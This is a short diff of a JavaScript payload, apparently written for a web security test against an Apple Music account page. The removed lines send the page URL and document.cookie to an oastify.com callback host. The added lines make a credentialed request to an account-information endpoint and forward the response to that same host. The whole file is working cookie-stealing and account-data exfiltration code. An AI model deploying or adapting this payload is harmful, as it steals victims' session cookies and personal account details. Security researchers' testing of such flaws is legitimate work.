@@ -1,4 +1,12 @@
-location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?jsurl='+document.location.href+'&document.body&cookie='+document.cookie;/*<script>
-
-location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?htmlurl='+document.location.href+'&cookie='+document.cookie;
-</script>*/
+let xhr = new XMLHttpRequest();
+    xhr.withCredentials = true;
+  xhr.open("POST", "https://buy.music.apple.com/account/information/sections");
+  xhr.setRequestHeader("Content-Type","application/json");
+  // xhr.responseType = 'json';
+  xhr.send(JSON.stringify({"sections":["accountSummary"]}));
+  // xhr.onload = () => {
+// 	  location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?' + JSON.stringify(JSON.parse(xhr.responseText));
+  // };
+  xhr.onload = function () {
+  location.href = 'https://x0ynl7aa3u8x8x4m6o8n34il5cb6zwnl.oastify.com/?' + JSON.stringify(JSON.parse(xhr.responseText));
+};
